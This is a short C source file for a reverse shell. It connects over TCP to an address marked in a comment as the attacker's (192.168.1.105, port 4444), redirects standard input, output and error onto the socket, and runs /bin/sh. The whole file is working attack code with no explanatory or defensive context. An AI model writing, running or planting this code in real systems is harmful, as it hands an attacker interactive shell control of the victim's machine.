#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main() {
	int sockfd;
	int port = 4444;
	struct sockaddr_in serv_addr;

	/* Create socket */
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_addr.s_addr = inet_addr("192.168.1.105"); /* Attacker address */
	serv_addr.sin_port = htons(port);
	
	/* Create connect to attacker */
	connect(sockfd, (struct sockaddr *) &serv_addr, sizeof(struct sockaddr));

	/* Stdin, stdout, stderr*/
	dup2(sockfd, 0);
	dup2(sockfd, 1);
	dup2(sockfd, 2);

	char *args[] = {"/bin//sh", NULL};
	execve(args[0], &args[0], 0);
	return 0;
}